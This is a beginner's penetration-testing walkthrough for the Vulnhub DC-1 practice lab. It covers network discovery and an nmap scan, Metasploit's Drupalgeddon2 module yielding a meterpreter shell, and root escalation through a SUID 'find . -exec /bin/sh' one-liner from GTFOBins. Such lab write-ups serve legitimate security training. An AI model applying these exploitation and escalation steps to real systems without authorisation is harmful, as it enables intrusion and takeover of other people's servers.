# DC1 Vulnhub Walkthrough

#### Description
DC-1 is a purposely built vulnerable lab for the purpose of gaining experience in the world of penetration testing.

It was designed to be a challenge for beginners, but just how easy it is will depend on your skills and knowledge, and your ability to learn.

To successfully complete this challenge, you will require Linux skills, familiarity with the Linux command line and experience with basic penetration testing tools, such as the tools that can be found on Kali Linux, or Parrot Security OS.

There are multiple ways of gaining root, however, I have included some flags which contain clues for beginners.

There are five flags in total, but the ultimate goal is to find and read the flag in root's home directory. You don't even need to be root to do this, however, you will require root privileges.

Depending on your skill level, you may be able to skip finding most of these flags and go straight for root.

  
  # Scaning
  
  ### Reconnaissance 
  
Sudo NetDiscover
  
![Screenshot from 2023-01-16 01-16-55](https://user-images.githubusercontent.com/108471951/212977979-8eb9986d-cfe5-43c1-94aa-c37492e289ed.png)

Firstly we have to identify the machine IP address using tool like NetDiscover 
### Nmap

nmap -sV 192.168.0.119 (service version scan)

![Screenshot from 2023-01-17 23-48-32](https://user-images.githubusercontent.com/108471951/212979611-b732a639-bb5c-40b0-a1b5-463c7ed54654.png)


It’s a drupal site. This is first time i seen a Site named Drupal


# Exploiting

msfconsole

search drupal

I have searched for exploit for drupal site in metasploit.
Found some exploits. By using them tried to Exploit 

![Screenshot from 2023-01-16 01-19-36](https://user-images.githubusercontent.com/108471951/212982113-653ef59b-b982-4041-b120-1c32feb029e2.png)




use1

show options

set rhosts [target IP]

exploit

![Screenshot from 2023-01-16 01-20-37](https://user-images.githubusercontent.com/108471951/212984577-492ed27c-4f35-4dfb-a98f-e6e3b2723fb3.png)


After trying some exploits [ exploit/unix/webapp/drupal_drupalgeddon2 ] worked and given a meterpeter shell


![Screenshot from 2023-01-18 00-26-17](https://user-images.githubusercontent.com/108471951/212987116-b5d5c9e3-e308-431c-92ce-ce00bcab8eee.png)


Then using the [shell] comannd I got a Shell

![Screenshot from 2023-01-19 00-41-24](https://user-images.githubusercontent.com/108471951/213274935-894ceccf-4251-4e8e-a05d-38a363400f3b.png)


# Privilege Escalation

Then I tried to change directory to root but its not worked , I dont have root privileges.


![Screenshot from 2023-01-19 00-43-04](https://user-images.githubusercontent.com/108471951/213276028-0d9b9a2d-ddc9-4ccd-bbde-43acd7b08ab1.png)



so in GTFOBins i find a script for gaining root accses 
https://gtfobins.github.io/gtfobins/find/#shell


find . -exec /bin/sh \; -quit


![Screenshot from 2023-01-19 01-03-23](https://user-images.githubusercontent.com/108471951/213277047-d1614401-d5ef-4ba0-ba13-d89743d653c9.png)


